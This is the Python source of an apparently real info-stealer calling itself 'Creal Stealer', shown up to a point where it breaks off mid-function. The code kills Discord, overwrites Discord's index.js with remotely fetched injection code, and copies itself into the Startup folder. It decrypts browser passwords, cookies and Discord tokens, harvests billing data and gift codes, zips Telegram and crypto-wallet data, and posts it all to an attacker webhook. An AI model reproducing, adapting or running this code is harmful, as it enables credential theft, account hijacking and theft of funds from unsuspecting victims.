import os
import threading
from sys import executable
from sqlite3 import connect as sql_connect
import re
from base64 import b64decode
from json import loads as json_loads, load
from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
from urllib.request import Request, urlopen
from json import *
import time
import shutil
from zipfile import ZipFile
import random
import re
import subprocess
import sys
import shutil





wh00k = "WEBHOOK HERE"
inj_url = "https://raw.githubusercontent.com/Ayhuuu/injection/main/index.js"
    
DETECTED = False

def g3t1p():
    ip = "None"
    try:
        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
    except:
        pass
    return ip

requirements = [
    ["requests", "requests"],
    ["Crypto.Cipher", "pycryptodome"],
]
for modl in requirements:
    try: __import__(modl[0])
    except:
        subprocess.Popen(f"{executable} -m pip install {modl[1]}", shell=True)
        time.sleep(3)

import requests
from Crypto.Cipher import AES

local = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')
temp = os.getenv("TEMP")
Threadlist = []


class DATA_BLOB(Structure):
    _fields_ = [
        ('cbData', wintypes.DWORD),
        ('pbData', POINTER(c_char))
    ]

def G3tD4t4(blob_out):
    cbData = int(blob_out.cbData)
    pbData = blob_out.pbData
    buffer = c_buffer(cbData)
    cdll.msvcrt.memcpy(buffer, pbData, cbData)
    windll.kernel32.LocalFree(pbData)
    return buffer.raw

def CryptUnprotectData(encrypted_bytes, entropy=b''):
    buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))
    buffer_entropy = c_buffer(entropy, len(entropy))
    blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)
    blob_entropy = DATA_BLOB(len(entropy), buffer_entropy)
    blob_out = DATA_BLOB()

    if windll.crypt32.CryptUnprotectData(byref(blob_in), None, byref(blob_entropy), None, None, 0x01, byref(blob_out)):
        return G3tD4t4(blob_out)

def D3kryptV4lU3(buff, master_key=None):
    starts = buff.decode(encoding='utf8', errors='ignore')[:3]
    if starts == 'v10' or starts == 'v11':
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass

def L04dR3qu3sTs(methode, url, data='', files='', headers=''):
    for i in range(8): 
        try:
            if methode == 'POST':
                if data != '':
                    r = requests.post(url, data=data)
                    if r.status_code == 200:
                        return r
                elif files != '':
                    r = requests.post(url, files=files)
                    if r.status_code == 200 or r.status_code == 413:
                        return r
        except:
            pass

def L04durl1b(wh00k, data='', files='', headers=''):
    for i in range(8):
        try:
            if headers != '':
                r = urlopen(Request(wh00k, data=data, headers=headers))
                return r
            else:
                r = urlopen(Request(wh00k, data=data))
                return r
        except: 
            pass

def globalInfo():
    ip = g3t1p()
    us3rn4m1 = os.getenv("USERNAME")
    ipdatanojson = urlopen(Request(f"https://geolocation-db.com/jsonp/{ip}")).read().decode().replace('callback(', '').replace('})', '}')
    
    ipdata = loads(ipdatanojson)
    
    contry = ipdata["country_name"]
    contryCode = ipdata["country_code"].lower()
    sehir = ipdata["state"]

    globalinfo = f":flag_{contryCode}:  - `{us3rn4m1.upper()} | {ip} ({contry})`"
    return globalinfo


def TR6st(C00k13):
    
    global DETECTED
    data = str(C00k13)
    tim = re.findall(".google.com", data)
    
    if len(tim) < -1:
        DETECTED = True
        return DETECTED
    else:
        DETECTED = False
        return DETECTED
        
def G3tUHQFr13ndS(t0k3n):
    b4dg3List =  [
        {"Name": 'Active_Developer', 'Value': 131072, 'Emoji': "<:activedev:1042545590640324608> "},
        {"Name": 'Early_Verified_Bot_Developer', 'Value': 131072, 'Emoji': "<:developer:874750808472825986> "},
        {"Name": 'Bug_Hunter_Level_2', 'Value': 16384, 'Emoji': "<:bughunter_2:874750808430874664> "},
        {"Name": 'Early_Supporter', 'Value': 512, 'Emoji': "<:early_supporter:874750808414113823> "},
        {"Name": 'House_Balance', 'Value': 256, 'Emoji': "<:balance:874750808267292683> "},
        {"Name": 'House_Brilliance', 'Value': 128, 'Emoji': "<:brilliance:874750808338608199> "},
        {"Name": 'House_Bravery', 'Value': 64, 'Emoji': "<:bravery:874750808388952075> "},
        {"Name": 'Bug_Hunter_Level_1', 'Value': 8, 'Emoji': "<:bughunter_1:874750808426692658> "},
        {"Name": 'HypeSquad_Events', 'Value': 4, 'Emoji': "<:hypesquad_events:874750808594477056> "},
        {"Name": 'Partnered_Server_Owner', 'Value': 2,'Emoji': "<:partner:874750808678354964> "},
        {"Name": 'Discord_Employee', 'Value': 1, 'Emoji': "<:staff:874750808728666152> "}
    ]
    headers = {
        "Authorization": t0k3n,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    try:
        friendlist = loads(urlopen(Request("https://discord.com/api/v6/users/@me/relationships", headers=headers)).read().decode())
    except:
        return False

    uhqlist = ''
    for friend in friendlist:
        Own3dB3dg4s = ''
        flags = friend['user']['public_flags']
        for b4dg3 in b4dg3List:
            if flags // b4dg3["Value"] != 0 and friend['type'] == 1:
                if not "House" in b4dg3["Name"]:
                    Own3dB3dg4s += b4dg3["Emoji"]
                flags = flags % b4dg3["Value"]
        if Own3dB3dg4s != '':
            uhqlist += f"{Own3dB3dg4s} | {friend['user']['username']}#{friend['user']['discriminator']} ({friend['user']['id']})\n"
    return uhqlist


process_list = os.popen('tasklist').readlines()


for process in process_list:
    if "Discord" in process:
        
        pid = int(process.split()[1])
        os.system(f"taskkill /F /PID {pid}")

def G3tb1ll1ng(t0k3n):
    headers = {
        "Authorization": t0k3n,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    try:
        b1ll1ngjson = loads(urlopen(Request("https://discord.com/api/users/@me/billing/payment-sources", headers=headers)).read().decode())
    except:
        return False
    
    if b1ll1ngjson == []: return "```None```"

    b1ll1ng = ""
    for methode in b1ll1ngjson:
        if methode["invalid"] == False:
            if methode["type"] == 1:
                b1ll1ng += ":credit_card:"
            elif methode["type"] == 2:
                b1ll1ng += ":parking: "

    return b1ll1ng

def inj_discord():

    username = os.getlogin()

    folder_list = ['Discord', 'DiscordCanary', 'DiscordPTB', 'DiscordDevelopment']

    for folder_name in folder_list:
        deneme_path = os.path.join(os.getenv('LOCALAPPDATA'), folder_name)
        if os.path.isdir(deneme_path):
            for subdir, dirs, files in os.walk(deneme_path):
                if 'app-' in subdir:
                    for dir in dirs:
                        if 'modules' in dir:
                            module_path = os.path.join(subdir, dir)
                            for subsubdir, subdirs, subfiles in os.walk(module_path):
                                if 'discord_desktop_core-' in subsubdir:
                                    for subsubsubdir, subsubdirs, subsubfiles in os.walk(subsubdir):
                                        if 'discord_desktop_core' in subsubsubdir:
                                            for file in subsubfiles:
                                                if file == 'index.js':
                                                    file_path = os.path.join(subsubsubdir, file)

                                                    inj_content = requests.get(inj_url).text

                                                    inj_content = inj_content.replace("%WEBHOOK%", wh00k)

                                                    with open(file_path, "w", encoding="utf-8") as index_file:
                                                        index_file.write(inj_content)
inj_discord()



def G37C0D35(token):
    try:
        codes = ""
        headers = {"Authorization": token,"Content-Type": "application/json","User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"}
        codess = loads(urlopen(Request("https://discord.com/api/v9/users/@me/outbound-promotions/codes?locale=en-GB", headers=headers)).read().decode())

        for code in codess:
            try:codes += f"<a:hira_kasaanahtari:886942856969875476> **{str(code['promotion']['outbound_title'])}**\n<:Rightdown:891355646476296272> `{str(code['code'])}`\n"
            except:pass

        nitrocodess = loads(urlopen(Request("https://discord.com/api/v9/users/@me/entitlements/gifts?locale=en-GB", headers=headers)).read().decode())
        if nitrocodess == []: return codes

        for element in nitrocodess:
            
            sku_id = element['sku_id']
            subscription_plan_id = element['subscription_plan']['id']
            name = element['subscription_plan']['name']

            url = f"https://discord.com/api/v9/users/@me/entitlements/gift-codes?sku_id={sku_id}&subscription_plan_id={subscription_plan_id}"
            nitrrrro = loads(urlopen(Request(url, headers=headers)).read().decode())

            for el in nitrrrro:
                cod = el['code']
                try:codes += f"<a:hira_kasaanahtari:886942856969875476> **{name}**\n<:Rightdown:891355646476296272> `https://discord.gift/{cod}`\n"
                except:pass
        return codes
    except:return ""






def G3tB4dg31(flags):
    if flags == 0: return ''

    Own3dB3dg4s = ''
    b4dg3List =  [
        {"Name": 'Active_Developer', 'Value': 131072, 'Emoji': "<:activedev:1042545590640324608> "},
        {"Name": 'Early_Verified_Bot_Developer', 'Value': 131072, 'Emoji': "<:developer:874750808472825986> "},
        {"Name": 'Bug_Hunter_Level_2', 'Value': 16384, 'Emoji': "<:bughunter_2:874750808430874664> "},
        {"Name": 'Early_Supporter', 'Value': 512, 'Emoji': "<:early_supporter:874750808414113823> "},
        {"Name": 'House_Balance', 'Value': 256, 'Emoji': "<:balance:874750808267292683> "},
        {"Name": 'House_Brilliance', 'Value': 128, 'Emoji': "<:brilliance:874750808338608199> "},
        {"Name": 'House_Bravery', 'Value': 64, 'Emoji': "<:bravery:874750808388952075> "},
        {"Name": 'Bug_Hunter_Level_1', 'Value': 8, 'Emoji': "<:bughunter_1:874750808426692658> "},
        {"Name": 'HypeSquad_Events', 'Value': 4, 'Emoji': "<:hypesquad_events:874750808594477056> "},
        {"Name": 'Partnered_Server_Owner', 'Value': 2,'Emoji': "<:partner:874750808678354964> "},
        {"Name": 'Discord_Employee', 'Value': 1, 'Emoji': "<:staff:874750808728666152> "}
    ]
    for b4dg3 in b4dg3List:
        if flags // b4dg3["Value"] != 0:
            Own3dB3dg4s += b4dg3["Emoji"]
            flags = flags % b4dg3["Value"]

    return Own3dB3dg4s

def G37UHQ6U11D5(token):
    try:
        uhqguilds = ''
        headers = {
            "Authorization": token,
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
        }
        guilds = loads(urlopen(Request("https://discord.com/api/v9/users/@me/guilds?with_counts=true", headers=headers)).read().decode())
        for guild in guilds:
            if guild["approximate_member_count"] < 1: continue
            if guild["owner"] or guild["permissions"] == "4398046511103":
                inv = loads(urlopen(Request(f"https://discord.com/api/v6/guilds/{guild['id']}/invites", headers=headers)).read().decode())    
                try:    cc = "https://discord.gg/"+str(inv[0]['code'])
                except: cc = False
                uhqguilds += f"<a:CH_IconArrowRight:715585320178941993> [{guild['name']}] **{str(guild['approximate_member_count'])} Members**\n"
        if uhqguilds == '': return '`No HQ Guilds Found`'
        return uhqguilds
    except:
        return 'No HQ Guilds Found'



def G3tT0k4n1nf9(t0k3n):
    headers = {
        "Authorization": t0k3n,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }

    us3rjs0n = loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers)).read().decode())
    us3rn4m1 = us3rjs0n["username"]
    hashtag = us3rjs0n["discriminator"]
    em31l = us3rjs0n["email"]
    idd = us3rjs0n["id"]
    pfp = us3rjs0n["avatar"]
    flags = us3rjs0n["public_flags"]
    n1tr0 = ""
    ph0n3 = ""

    if "premium_type" in us3rjs0n: 
        nitrot = us3rjs0n["premium_type"]
        if nitrot == 1:
            n1tr0 = "<a:DE_BadgeNitro:865242433692762122>"
        elif nitrot == 2:
            n1tr0 = "<a:DE_BadgeNitro:865242433692762122><a:autr_boost1:1038724321771786240>"
    if "ph0n3" in us3rjs0n: ph0n3 = f'{us3rjs0n["ph0n3"]}'

    return us3rn4m1, hashtag, em31l, idd, pfp, flags, n1tr0, ph0n3

def ch1ckT4k1n(t0k3n):
    headers = {
        "Authorization": t0k3n,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    try:
        urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers))
        return True
    except:
        return False

if getattr(sys, 'frozen', False):
    currentFilePath = os.path.dirname(sys.executable)
else:
    currentFilePath = os.path.dirname(os.path.abspath(__file__))

fileName = os.path.basename(sys.argv[0])
filePath = os.path.join(currentFilePath, fileName)

startupFolderPath = os.path.join(os.path.expanduser('~'), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
startupFilePath = os.path.join(startupFolderPath, fileName)

if os.path.abspath(filePath).lower() != os.path.abspath(startupFilePath).lower():
    with open(filePath, 'rb') as src_file, open(startupFilePath, 'wb') as dst_file:
        shutil.copyfileobj(src_file, dst_file)



def Tr1M(obj):
    if len(obj) > 1000: 
        f = obj.split("\n")
        obj = ""
        for i in f:
            if len(obj)+ len(i) >= 1000: 
                obj += "..."
                break
            obj += i + "\n"
    return obj

def upl05dT4k31(t0k3n, path):
    global wh00k
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    us3rn4m1, hashtag, em31l, idd, pfp, flags, n1tr0, ph0n3 = G3tT0k4n1nf9(t0k3n)

    if pfp == None: 
        pfp = "https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/main/img/xd.jpg"
    else:
        pfp = f"https://cdn.discordapp.com/avatars/{idd}/{pfp}"

    b1ll1ng = G3tb1ll1ng(t0k3n)
    b4dg3 = G3tB4dg31(flags)
    friends = G3tUHQFr13ndS(t0k3n)
    guilds = Tr1M(G37UHQ6U11D5(t0k3n))
    codes = Tr1M(G37C0D35(t0k3n))


    if codes == "": codes = "`No Gifts Found`"
    if friends == '': friends = "```No Rare Friends```"
    if not b1ll1ng:
        b4dg3, ph0n3, b1ll1ng = "🔒", "🔒", "🔒"
    if n1tr0 == '' and b4dg3 == '': n1tr0 = "```None```"
    if guilds == "": guilds = ":lock:"
    data = {
        "content": f'{globalInfo()} | `{path}`',
        "embeds": [
            {
            "color": 2895667,
            "fields": [
                {
                    "name": "<a:hyperNOPPERS:828369518199308388> Token:",
                    "value": f"```{t0k3n}```",
                    "inline": True
                },
                {
                    "name": "<:mail:750393870507966486> Email:",
                    "value": f"```{em31l}```",
                    "inline": True
                },
                {
                    "name": "<a:1689_Ringing_Phone:755219417075417088> Phone:",
                    "value": f"```{ph0n3}```",
                    "inline": True
                },
                {
                    "name": "<:mc_earth:589630396476555264> IP:",
                    "value": f"```{g3t1p()}```",
                    "inline": True
                },
                {
                    "name": "<:woozyface:874220843528486923> Badges:",
                    "value": f"{n1tr0}{b4dg3}",
                    "inline": True
                },
                {
                    "name": "<a:4394_cc_creditcard_cartao_f4bihy:755218296801984553> Billing:",
                    "value": f"{b1ll1ng}",
                    "inline": True
                },
                {
                    "name": "<a:mavikirmizi:853238372591599617> HQ Friends:",
                    "value": f"{friends}",
                    "inline": False
                },
                
                {
                    "name": "<a:mavikirmizi:853238372591599617> Gift Codes:",
                    "value": f"`{codes}`",
                    "inline": False
                },

                {
                    "name": "<:woozyface:874220843528486923> HQ Guilds:",
                    "value": f"{guilds}",
                    "inline": False
                }

                ],
            "author": {
                "name": f"{us3rn4m1}#{hashtag} ({idd})",
                "icon_url": f"{pfp}"
                },
            "footer": {
                "text": "Creal Stealer | https://t.me/CrealStealer",
                "icon_url": "https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/main/img/xd.jpg"
                },
            "thumbnail": {
                "url": f"{pfp}"
                }
            }
        ],
        "avatar_url": "https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/main/img/xd.jpg",
        "username": "Creal Stealer",
        "attachments": []
        }
    L04durl1b(wh00k, data=dumps(data).encode(), headers=headers)


def R4f0rm3t(listt):
    e = re.findall("(\w+[a-z])",listt)
    while "https" in e: e.remove("https")
    while "com" in e: e.remove("com")
    while "net" in e: e.remove("net")
    return list(set(e))

def upload(name, link):
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }

    if name == "crcook":
        rb = ' | '.join(da for da in cookiWords)
        if len(rb) > 1000: 
            rrrrr = R4f0rm3t(str(cookiWords))
            rb = ' | '.join(da for da in rrrrr)
        data = {
            "content": f"{globalInfo()}",
            "embeds": [
                {
                    "title": "Creal | Cookies Stealer",
                    "description": f"<:apollondelirmis:1012370180845883493>: **Accounts:**\n\n{rb}\n\n**Data:**\n<:cookies_tlm:816619063618568234> • **{CookiCount}** Cookies Found\n<a:CH_IconArrowRight:715585320178941993> • [CrealCookies.txt]({link})",
                    "color": 2895667,
                    "footer": {
                        "text": "Creal Stealer | https://t.me/CrealStealer",
                        "icon_url": "https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/main/img/xd.jpg"
                    }
                }
            ],
            "username": "Creal Stealer",
            "avatar_url": "https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/main/img/xd.jpg",
            "attachments": []
            }
        L04durl1b(wh00k, data=dumps(data).encode(), headers=headers)
        return

    if name == "crpassw":
        ra = ' | '.join(da for da in paswWords)
        if len(ra) > 1000: 
            rrr = R4f0rm3t(str(paswWords))
            ra = ' | '.join(da for da in rrr)

        data = {
            "content": f"{globalInfo()}",
            "embeds": [
                {
                    "title": "Creal | Password Stealer",
                    "description": f"<:apollondelirmis:1012370180845883493>: **Accounts**:\n{ra}\n\n**Data:**\n<a:hira_kasaanahtari:886942856969875476> • **{P4sswCount}** Passwords Found\n<a:CH_IconArrowRight:715585320178941993> • [CrealPassword.txt]({link})",
                    "color": 2895667,
                    "footer": {
                        "text": "Creal Stealer | https://t.me/CrealStealer ",
                        "icon_url": "https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/main/img/xd.jpg"
                    }
                }
            ],
            "username": "Creal",
            "avatar_url": "https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/main/img/xd.jpg",
            "attachments": []
            }
        L04durl1b(wh00k, data=dumps(data).encode(), headers=headers)
        return

    if name == "kiwi":
        data = {
            "content": f"{globalInfo()}",
            "embeds": [
                {
                "color": 2895667,
                "fields": [
                    {
                    "name": "Interesting files found on user PC:",
                    "value": link
                    }
                ],
                "author": {
                    "name": "Creal | File Stealer"
                },
                "footer": {
                    "text": "Creal Stealer | https://t.me/CrealStealer ",
                    "icon_url": "https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/main/img/xd.jpg"
                }
                }
            ],
            "username": "Creal Stealer",
            "avatar_url": "https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/main/img/xd.jpg",
            "attachments": []
            }
        L04durl1b(wh00k, data=dumps(data).encode(), headers=headers)
        return








def wr1tef0rf1l3(data, name):
    path = os.getenv("TEMP") + f"\cr{name}.txt"
    with open(path, mode='w', encoding='utf-8') as f:
        f.write(f"<--Creal STEALER BEST -->\n\n")
        for line in data:
            if line[0] != '':
                f.write(f"{line}\n")

T0k3ns = ''
def getT0k3n(path, arg):
    if not os.path.exists(path): return

    path += arg
    for file in os.listdir(path):
        if file.endswith(".log") or file.endswith(".ldb")   :
            for line in [x.strip() for x in open(f"{path}\\{file}", errors="ignore").readlines() if x.strip()]:
                for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", r"mfa\.[\w-]{80,95}"):
                    for t0k3n in re.findall(regex, line):
                        global T0k3ns
                        if ch1ckT4k1n(t0k3n):
                            if not t0k3n in T0k3ns:
                               
                                T0k3ns += t0k3n
                                upl05dT4k31(t0k3n, path)

P4ssw = []

def getP4ssw(path, arg):
    global P4ssw, P4sswCount
    if not os.path.exists(path): return

    pathC = path + arg + "/Login Data"
    if os.stat(pathC).st_size == 0: return

    tempfold = temp + "cr" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"

    shutil.copy2(pathC, tempfold)
    conn = sql_connect(tempfold)
    cursor = conn.cursor()
    cursor.execute("SELECT action_url, username_value, password_value FROM logins;")
    data = cursor.fetchall()
    cursor.close()
    conn.close()
    os.remove(tempfold)

    pathKey = path + "/Local State"
    with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
    master_key = CryptUnprotectData(master_key[5:])

    for row in data: 
        if row[0] != '':
            for wa in keyword:
                old = wa
                if "https" in wa:
                    tmp = wa
                    wa = tmp.split('[')[1].split(']')[0]
                if wa in row[0]:
                    if not old in paswWords: paswWords.append(old)
            P4ssw.append(f"UR1: {row[0]} | U53RN4M3: {row[1]} | P455W0RD: {D3kryptV4lU3(row[2], master_key)}")
            P4sswCount += 1
    wr1tef0rf1l3(P4ssw, 'passw')

C00k13 = []    
def getC00k13(path, arg):
    global C00k13, CookiCount
    if not os.path.exists(path): return
    
    pathC = path + arg + "/Cookies"
    if os.stat(pathC).st_size == 0: return
    
    tempfold = temp + "cr" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
    
    shutil.copy2(pathC, tempfold)
    conn = sql_connect(tempfold)
    cursor = conn.cursor()
    cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
    data = cursor.fetchall()
    cursor.close()
    conn.close()
    os.remove(tempfold)

    pathKey = path + "/Local State"
    
    with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
    master_key = CryptUnprotectData(master_key[5:])

    for row in data: 
        if row[0] != '':
            for wa in keyword:
                old = wa
                if "https" in wa:
                    tmp = wa
                    wa = tmp.split('[')[1].split(']')[0]
                if wa in row[0]:
                    if not old in cookiWords: cookiWords.append(old)
            C00k13.append(f"{row[0]}	TRUE	/	FALSE	2597573456	{row[1]}	{D3kryptV4lU3(row[2], master_key)}")
            CookiCount += 1
    wr1tef0rf1l3(C00k13, 'cook')




def G3tD1sc0rd(path, arg):
    if not os.path.exists(f"{path}/Local State"): return

    pathC = path + arg

    pathKey = path + "/Local State"
    with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
    master_key = CryptUnprotectData(master_key[5:])
    
    
    for file in os.listdir(pathC):
       
        if file.endswith(".log") or file.endswith(".ldb")   :
            for line in [x.strip() for x in open(f"{pathC}\\{file}", errors="ignore").readlines() if x.strip()]:
                for t0k3n in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                    global T0k3ns
                    t0k3nDecoded = D3kryptV4lU3(b64decode(t0k3n.split('dQw4w9WgXcQ:')[1]), master_key)
                    if ch1ckT4k1n(t0k3nDecoded):
                        if not t0k3nDecoded in T0k3ns:
                            
                            T0k3ns += t0k3nDecoded
                            
                            upl05dT4k31(t0k3nDecoded, path)

def GatherZips(paths1, paths2, paths3):
    thttht = []
    for patt in paths1:
        a = threading.Thread(target=Z1pTh1ngs, args=[patt[0], patt[5], patt[1]])
        a.start()
        thttht.append(a)

    for patt in paths2:
        a = threading.Thread(target=Z1pTh1ngs, args=[patt[0], patt[2], patt[1]])
        a.start()
        thttht.append(a)
    
    a = threading.Thread(target=ZipTelegram, args=[paths3[0], paths3[2], paths3[1]])
    a.start()
    thttht.append(a)

    for thread in thttht: 
        thread.join()
    global WalletsZip, GamingZip, OtherZip
        

    wal, ga, ot = "",'',''
    if not len(WalletsZip) == 0:
        wal = ":coin:  •  Wallets\n"
        for i in WalletsZip:
            wal += f"└─ [{i[0]}]({i[1]})\n"
    if not len(WalletsZip) == 0:
        ga = ":video_game:  •  Gaming:\n"
        for i in GamingZip:
            ga += f"└─ [{i[0]}]({i[1]})\n"
    if not len(OtherZip) == 0:
        ot = ":tickets:  •  Apps\n"
        for i in OtherZip:
            ot += f"└─ [{i[0]}]({i[1]})\n"          
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    
    data = {
        "content": globalInfo(),
        "embeds": [
            {
            "title": "Creal Zips",
            "description": f"{wal}\n{ga}\n{ot}",
            "color": 2895667,
            "footer": {
                "text": "Creal Stealer | https://t.me/CrealStealer",
                "icon_url": "https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/main/img/xd.jpg"
            }
            }
        ],
        "username": "Creal Stealer",
        "avatar_url": "https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/main/img/xd.jpg",
        "attachments": []
    }
    L04durl1b(wh00k, data=dumps(data).encode(), headers=headers)


def ZipTelegram(path, arg, procc):
    global OtherZip
    pathC = path
    name = arg
    if not os.path.exists(pathC): return
    subprocess.Popen(f"taskkill /im {procc} /t /f >nul 2>&1", shell=True)

    zf = ZipFile(f"{pathC}/{name}.zip", "w")
    for file in os.listdir(pathC):
        if not ".zip" in file and not "tdummy" in file and not "user_data" in file and not "webview" in file: 
            zf.write(pathC + "/" + file)
    zf.close()

    lnik = uploadToAnonfiles(f'{pathC}/{name}.zip')
    
    os.remove(f"{pathC}/{name}.zip")
    OtherZip.append([arg, lnik])

def Z1pTh1ngs(path, arg, procc):
    pathC = path
    name = arg
    global WalletsZip, GamingZip, OtherZip
    
    if "fnjhmkhhmkbjkkabndcnnogagogbneec" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"Ronin_{browser}"
        pathC = path + arg
    
    if "ojggmchlghnjlapmfbnjholfjkiidbch" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"Venom_{browser}"
        pathC = path + arg

    if "opcgpfmipidbgpenhmajoajpbobppdil" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"Sui_{browser}"
        pathC = path + arg

    if "efbglgofoippbgcjepnhiblaibcnclgk" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"Martian_{browser}"
        pathC = path + arg
    
    if "ibnejdfjmmkpcnlpebklmnkoeoihofec" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"Tron_{browser}"
        pathC = path + arg
    
    if "ejjladinnckdgjemekebdpeokbikhfci" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"Petra_{browser}"
        pathC = path + arg

    if "phkbamefinggmakgklpkljjmgibohnba" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"Pontem_{browser}"
        pathC = path + arg

    if "ebfidpplhabeedpnhjnobghokpiioolj" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"Fewcha_{browser}"
        pathC = path + arg

    if "afbcbjpbpfadlkmhmclhkeeodmamcflc" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"Math_{browser}"
        pathC = path + arg

    if "aeachknmefphepccionboohckonoeemg" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"Coin98_{browser}"
        pathC = path + arg

    if "bhghoamapcdpbohphigoooaddinpkbai" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"Authenticator_{browser}"
        pathC = path + arg

    if "aholpfdialjgjfhomihkjbmgjidlcdno" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"ExodusWeb3_{browser}"
        pathC = path + arg

    if "agoakfejjabomempkjlepdflaleeobhb" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"Core_{browser}"
        pathC = path + arg

    if "mfgccjchihfkkindfppnaooecgfneiii" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"Tokenpocket_{browser}"
        pathC = path + arg

    if "lgmpcpglpngdoalbgeoldeajfclnhafa" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"Safepal_{browser}"
        pathC = path + arg

    if "bhhhlbepdkbapadjdnnojkbgioiodbic" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"Solfare_{browser}"
        pathC = path + arg

    if "jblndlipeogpafnldhgmapagcccfchpi" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"Kaikas_{browser}"
        pathC = path + arg

    if "kncchdigobghenbbaddojjnnaogfppfj" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"iWallet_{browser}"
        pathC = path + arg

    if "ffnbelfdoeiohenkjibnmadjiehjhajb" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"Yoroi_{browser}"
        pathC = path + arg

    if "hpglfhgfnhbgpjdenjgmdgoeiappafln" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"Guarda_{browser}"
        pathC = path + arg

    if "cjelfplplebdjjenllpjcblmjkfcffne" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"Jaxx Liberty_{browser}"
        pathC = path + arg

    if "amkmjjmmflddogmhpjloimipbofnfjih" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"Wombat_{browser}"
        pathC = path + arg

    if "fhilaheimglignddkjgofkcbgekhenbh" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"Oxygen_{browser}"
        pathC = path + arg

    if "nlbmnnijcnlegkjjpcfjclmcfggfefdm" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"MEWCX_{browser}"
        pathC = path + arg

    if "nanjmdknhkinifnkgdcggcfnhdaammmj" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"Guild_{browser}"
        pathC = path + arg

    if "nkddgncdjgjfcddamfgcmfnlhccnimig" in arg:
